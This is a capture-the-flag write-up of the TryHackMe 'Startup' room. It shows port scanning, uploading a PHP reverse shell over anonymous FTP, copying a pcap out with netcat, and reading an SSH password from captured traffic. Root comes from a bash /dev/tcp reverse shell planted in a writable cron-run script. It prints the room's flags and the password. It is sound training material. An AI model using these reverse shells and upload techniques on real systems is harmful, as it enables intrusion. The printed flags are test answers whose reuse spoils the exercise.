# Startup

Tryhackme Startup - Linux - Easy

https://tryhackme.com/room/startup

## Nmap
```shell
└──╼ $nmap -sC -sV -oA nmap/startup 10.10.163.144
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 00:20 IST
Nmap scan report for 10.10.163.144
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.95.227
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9a60b841d2201a401304843612bab94 (RSA)
|   256 ec13258c182036e6ce910e1626eba2be (ECDSA)
|_  256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

![Homepage](https://hackmd.io/_uploads/Sk6vkpdI2.png)

In homepage there is nothing, so to find directory, we have use gobuster.

```shell
└──╼ $gobuster dir -u 10.10.163.144 -w /usr/share/wordlists/dirb/common.txt 

... other stuff ...

/files
```

There are two files `notice.txt` and `important.jpg` but there is nothing in it.

notice.txt - `Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
`

From this, I got idea of uploading shell via FTP, login with `anonymous`.

You can download [PHP Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and change IP and PORT.

```shell
└──╼ $ftp 10.10.163.144
Connected to 10.10.163.144.
220 (vsFTPd 3.0.3)
Name (10.10.163.144:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Jun 03 14:01 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.00 secs (70.7910 MB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118          5493 Jun 03 14:01 php-reverse-shell.php
226 Directory send OK.
ftp> 
```

Go to reverse shell url and we will catch shell using `nc`

We got our first flag
```
www-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

###  What is the secret spicy soup recipe?
Answer: `Love`

Now, go to `/incidents` on server, and we will get a wireshark file, we can download that using netcat

```shell
On server,
nc -w 3 10.8.95.227 1234 < suspicious.pcapng

On local,
nc -l -p 1234 > suspicious.pcapng
```

When we follow TCP stream in wireshark, we will get ssh password for `lennie`, that is `c4ntg3t3n0ughsp1c3`.

![](https://hackmd.io/_uploads/Hy3HU0u8h.png)

After login with lennie's credentials, we get user.txt flag.

```shell
$ ls
Documents  scripts  user.txt
$ cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

## Privilege Escalation

There are certain files in lennie's home folder, and we can edit `/etc/print.sh` therefore, I have put reverse shell in `print.sh` and using netcat, I got root user.

```shell
lennie@startup:~$ ls
Documents  scripts  user.txt
lennie@startup:~$ cd scripts/
lennie@startup:~/scripts$ ls
planner.sh  startup_list.txt
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ cat /etc/print.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.8.95.227/6667 0>&1
echo "Done!"
```
Using netcat,
```shell
root@startup:~# ls
ls
root.txt
root@startup:~# cat ro	
cat root.txt 
THM{f963aaa6a430f210222158ae15c3d76d}
```
